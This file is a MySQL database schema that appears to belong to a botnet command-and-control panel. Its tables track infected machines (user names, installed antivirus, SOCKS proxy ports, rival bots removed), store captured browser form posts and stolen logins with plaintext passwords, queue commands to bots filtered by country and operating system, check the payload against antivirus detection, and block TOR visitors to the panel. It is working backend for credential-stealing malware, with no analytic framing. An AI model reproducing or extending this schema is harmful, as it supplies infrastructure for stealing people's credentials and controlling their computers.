
CREATE TABLE IF NOT EXISTS `admins` (
  `id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(16) CHARACTER SET ascii NOT NULL,
  `password_hash` varchar(40) CHARACTER SET ascii NOT NULL,
  `priv_mask` int(10) unsigned NOT NULL,
  `options` int(10) unsigned NOT NULL,
  `lastlogin` int(10) unsigned NOT NULL COMMENT 'UNIX time',
  `sort_type` varchar(16) NOT NULL,
  `sort_order` varchar(8) NOT NULL,
  `sort_max_per_page` int(11) NOT NULL,
  KEY `id` (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 COMMENT='Administrative users table' AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `blacklist` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `host` int(11) NOT NULL COMMENT 'IP',
  `reason_id` smallint(6) NOT NULL,
  `date_added` int(10) unsigned NOT NULL COMMENT 'UNIX time',
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COMMENT='Blacklisted IPs' AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `clients` (
  `id` bigint(10) unsigned NOT NULL AUTO_INCREMENT COMMENT 'Entry ID',
  `GUID` binary(16) NOT NULL COMMENT 'Machine ID',
  `Version` int(11) NOT NULL COMMENT 'Bot client version',
  `CompNameUsername` binary(128) NOT NULL COMMENT 'Computer/User name',
  `CpuName` binary(128) NOT NULL COMMENT 'CPU Description',
  `VideoCardName` binary(128) NOT NULL COMMENT 'VCard Description',
  `InstallPath` binary(255) NOT NULL COMMENT 'Install Path',
  `FirstCheckIn` int(10) unsigned NOT NULL COMMENT 'First request sent (Similar to InstallDate)',
  `LastCheckIn` int(10) unsigned NOT NULL COMMENT 'Last Bot CheckIn time',
  `LastInfoReport` int(10) unsigned NOT NULL COMMENT 'Last formgrab/logins logs sent',
  `DnsModify_Revision` bigint(20) unsigned NOT NULL COMMENT 'Dns Modification script version',
  `UrlTrack_Revision` bigint(20) unsigned NOT NULL COMMENT 'Formgrab Url Tracklist version',
  `Config_Revision` bigint(20) unsigned NOT NULL COMMENT 'Dynamic Config version',
  `FileSearch_Revision` int(10) unsigned NOT NULL COMMENT 'File search version',
  `Plugins_Revision` int(10) unsigned NOT NULL COMMENT 'Plugin configuration version',
  `Reserved0_Version` int(10) unsigned NOT NULL COMMENT 'Reserved for future use',
  `OS` int(10) unsigned NOT NULL COMMENT 'Operating System',
  `Locale` char(2) NOT NULL COMMENT '2-Digit country code of bot',
  `BotTime` bigint(20) unsigned NOT NULL COMMENT 'Bot local time',
  `LastIP` int(10) unsigned NOT NULL COMMENT 'Last IP of bot',
  `DefaultBrowser` varbinary(32) NOT NULL COMMENT 'Default browser',
  `SocksPort` smallint(5) unsigned NOT NULL COMMENT 'Socks4 Port',
  `BotsKilled` smallint(5) unsigned NOT NULL COMMENT 'Number of bots removed since installation',
  `RecordAttributes` int(10) unsigned NOT NULL COMMENT 'Various panel record attributes',
  `ClientAttributes` int(10) unsigned NOT NULL COMMENT 'Bot attributes',
  `ClientStatus` int(10) unsigned NOT NULL COMMENT 'Status of client',
  `AvsInstalled` int(10) unsigned NOT NULL COMMENT 'Installed AV products',
  `SoftwareInstalled` int(10) unsigned NOT NULL COMMENT 'Various installed software',
  `ExceptionInfo` int(10) unsigned NOT NULL COMMENT 'Exception information',
  `LastTask` bigint(20) unsigned NOT NULL COMMENT 'Last command sent ID',
  `LastError` int(11) NOT NULL COMMENT 'Last client error',
  `GroupName` varchar(12) NOT NULL COMMENT 'Group name',
  `Comments` varchar(64) NOT NULL COMMENT 'Any comment on record',
  `last_tasks_hash` varchar(64) NOT NULL COMMENT 'Last tasks unique hash',
  PRIMARY KEY (`id`),
  KEY `GUID` (`GUID`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `exlogs` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT 'id',
  `event_type` int(10) unsigned NOT NULL COMMENT 'Type of event',
  `username` varchar(255) NOT NULL COMMENT 'Username for log',
  `ip_addr` varchar(32) NOT NULL COMMENT 'IP address',
  `exdata` text NOT NULL COMMENT 'Extended information',
  `create_date` int(10) unsigned NOT NULL COMMENT 'Date of event',
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 COMMENT='Stores extended logs' AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `geoip` (
  `IP_STR_FROM` varchar(16) NOT NULL COMMENT 'String ip begin',
  `IP_STR_TO` varchar(16) NOT NULL COMMENT 'String ip end',
  `IP_FROM` double NOT NULL COMMENT 'IP Range begin',
  `IP_TO` double NOT NULL COMMENT 'IP Range end',
  `COUNTRY_CODE2` char(2) NOT NULL COMMENT '2-Char country code (ISO-3166)',
  `COUNTRY_NAME` varchar(50) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

CREATE TABLE IF NOT EXISTS `geoip_city_ips` (
  `startIPNum` int(10) unsigned NOT NULL,
  `endIPNum` int(10) unsigned NOT NULL,
  `locID` int(10) unsigned NOT NULL,
  PRIMARY KEY (`startIPNum`,`endIPNum`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 PACK_KEYS=1 DELAY_KEY_WRITE=1;

CREATE TABLE IF NOT EXISTS `geoip_asn` (
  `ip_begin` int(10) unsigned NOT NULL,
  `ip_end` int(10) unsigned NOT NULL,
  `asn_name` text COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci COMMENT='GeoLite ASN';

CREATE TABLE IF NOT EXISTS `geoip_city` (
  `locID` int(10) unsigned NOT NULL,
  `country` char(8) COLLATE utf8_unicode_ci DEFAULT NULL,
  `region` char(8) COLLATE utf8_unicode_ci DEFAULT NULL,
  `city` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `postalCode` char(32) CHARACTER SET latin1 DEFAULT NULL,
  `latitude` double DEFAULT NULL,
  `longitude` double DEFAULT NULL,
  `dmaCode` char(8) CHARACTER SET latin1 DEFAULT NULL,
  `areaCode` char(8) CHARACTER SET latin1 DEFAULT NULL,
  PRIMARY KEY (`locID`),
  KEY `Index_Country` (`country`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci ROW_FORMAT=FIXED;

CREATE TABLE IF NOT EXISTS `grabbed_forms` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT COMMENT 'Entry ID',
  `bot_guid` binary(16) NOT NULL COMMENT 'Machine GUID of source bot',
  `bot_id` bigint(20) unsigned NOT NULL COMMENT 'Record ID of source bot',
  `host` varchar(255) CHARACTER SET ascii COLLATE ascii_bin NOT NULL COMMENT 'Host form captured from',
  `post_data` text NOT NULL COMMENT 'Content of post data',
  `post_headers` text CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL COMMENT 'Select headers from post data',
  `host_process_path` varbinary(255) NOT NULL COMMENT 'Process data captured from on local computer',
  `capture_date` int(10) unsigned NOT NULL COMMENT 'Date/time post data was captured',
  `bot_OS` int(11) NOT NULL,
  `bot_LocalTime` int(11) NOT NULL,
  `bot_LastIP` int(11) NOT NULL,
  `bot_Group` varchar(12) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `id` (`id`),
  KEY `id_2` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COMMENT='Browser form data captures' AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `grabbed_form_filters` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT 'Record ID',
  `options` int(10) unsigned NOT NULL COMMENT 'Misc. filter options',
  `filter_mask` varchar(255) NOT NULL COMMENT 'Wildcard mask for host filter',
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `grabbed_logins` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT COMMENT 'Entry ID',
  `bot_guid` binary(16) NOT NULL COMMENT 'Source bot GUID',
  `bot_id` bigint(20) unsigned NOT NULL COMMENT 'Source bot clients ID',
  `info_hash` char(40) CHARACTER SET ascii NOT NULL COMMENT 'SHA1 hash of host/user/password (lowercase)',
  `login_type` mediumint(8) unsigned NOT NULL COMMENT 'Source of login information',
  `host` varchar(255) NOT NULL COMMENT 'Hostname/IP',
  `port` smallint(5) unsigned NOT NULL COMMENT 'Port',
  `user` varchar(255) NOT NULL COMMENT 'Username',
  `password` varchar(255) NOT NULL COMMENT 'Password',
  `date_added` int(10) unsigned NOT NULL COMMENT 'Date added to database',
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COMMENT='Grabbed login information' AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `login_tries` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT 'id',
  `ip_address` int(10) unsigned NOT NULL COMMENT 'IP address of user',
  `attempt_date` int(10) unsigned NOT NULL COMMENT 'Date of failed login attempt',
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COMMENT='Maintains login access records (Anti-brute force)' AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `notices` (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT 'index',
  `notice_target` varchar(255) NOT NULL COMMENT 'User to display notice to (Unused)',
  `notice_author` varchar(255) NOT NULL COMMENT 'Author of notice',
  `notice_content` text NOT NULL COMMENT 'Notice content',
  `notice_options` int(10) unsigned NOT NULL COMMENT 'Various options',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COMMENT='Custom reminders / alerts table' AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `settings` (
  `strid` varchar(6) CHARACTER SET ascii NOT NULL,
  `version` varchar(24) CHARACTER SET ascii NOT NULL COMMENT 'version of bot',
  `name` varchar(32) CHARACTER SET ascii NOT NULL COMMENT 'name of net',
  `language` varchar(16) CHARACTER SET ascii NOT NULL COMMENT 'language for panel shit',
  `securecode` varchar(16) CHARACTER SET ascii NOT NULL COMMENT 'security code for login page',
  `crypt_key` varchar(32) CHARACTER SET ascii NOT NULL COMMENT 'crypt key for comms. encryption',
  `created` int(11) NOT NULL COMMENT 'date created (UNIX)',
  `absent_limit` smallint(6) NOT NULL COMMENT 'Max # of days before being marked dead',
  `knock_interval` mediumint(8) unsigned NOT NULL COMMENT 'Knock interval (in minutes) for bots',
  `general_flags` int(10) unsigned NOT NULL COMMENT 'general panel boolean options/flags',
  `security_flags` int(10) unsigned NOT NULL COMMENT 'general panel security boolean options/flags',
  `dnslist_version` bigint(20) unsigned NOT NULL,
  `urltrack_version` bigint(20) unsigned NOT NULL,
  `dynconfig_version` bigint(20) unsigned NOT NULL,
  `filesearch_version` bigint(10) unsigned NOT NULL COMMENT 'File search param config version',
  `plugins_version` bigint(20) unsigned NOT NULL,
  `reserved0_version` bigint(20) unsigned NOT NULL,
  `peak_clients` int(10) unsigned NOT NULL,
  `avcheck_api_id` varchar(32) NOT NULL,
  `avcheck_api_token` varchar(256) NOT NULL,
  `avcheck_last_result` mediumtext NOT NULL,
  `avcheck_num_detections` int(11) NOT NULL COMMENT 'Number of detections',
  `avcheck_last_check` int(10) unsigned NOT NULL COMMENT 'Last time file was checked',
  `exconfig_data` mediumtext NOT NULL,
  `log_options` int(10) unsigned NOT NULL COMMENT 'Options for event logging',
  `last_tasks_hash` varchar(64) NOT NULL COMMENT 'Last tasks unique hash'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

CREATE TABLE IF NOT EXISTS `tasks` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT 'Task ID',
  `tb_id` int(11) NOT NULL COMMENT 'Bot unique task id',
  `name` varchar(64) NOT NULL COMMENT 'Name of task',
  `user` varchar(255) NOT NULL COMMENT 'User who created the task',
  `cmd_hash` varchar(64) NOT NULL COMMENT 'For security purposes',
  `command` text NOT NULL COMMENT 'Command data',
  `max_bots` int(10) unsigned NOT NULL COMMENT 'Maximum number of bots that can execute this command',
  `bots_executed` int(10) unsigned NOT NULL COMMENT 'Number of bots already executed this command',
  `bots_failed` int(10) unsigned NOT NULL COMMENT 'Bots that reported fail task execution',
  `target_general_flags` int(10) unsigned NOT NULL COMMENT 'General flags',
  `target_flags` int(10) unsigned NOT NULL COMMENT 'Bot attribute flags',
  `target_os` int(10) unsigned NOT NULL COMMENT 'Filtered operating systems',
  `target_software` int(10) unsigned NOT NULL COMMENT 'Targeted software',
  `target_hosts` text NOT NULL COMMENT 'Targeted IPs',
  `target_guids` text NOT NULL COMMENT 'Targeted client GUIDs',
  `target_locales` text NOT NULL COMMENT 'Filter countries',
  `target_groups` text NOT NULL COMMENT 'Groups to target',
  `status` int(10) unsigned NOT NULL COMMENT 'Status of task',
  `task_type` smallint(5) unsigned NOT NULL COMMENT 'Type of command',
  `expiration_date` int(10) unsigned NOT NULL COMMENT 'Expiration date of task',
  `creation_date` int(10) unsigned NOT NULL COMMENT 'Creation date',
  PRIMARY KEY (`id`),
  KEY `index` (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `tasks_completed` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT COMMENT 'iIdex',
  `client_id` bigint(20) unsigned NOT NULL COMMENT 'ID of client in clients table',
  `completion_date` int(10) unsigned NOT NULL COMMENT 'Date of completion',
  `task_id` bigint(20) NOT NULL COMMENT 'ID of task completed',
  PRIMARY KEY (`id`),
  KEY `id` (`id`),
  KEY `client_id` (`client_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COMMENT='Completion records for all tasks performed by bots' AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `tor_ips` (
  `node_ip` int(10) unsigned NOT NULL COMMENT 'TOR IP',
  `num_visits` int(10) unsigned NOT NULL COMMENT 'Number of times panel has blocked a request from this IP'
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COMMENT='TOR IP list';
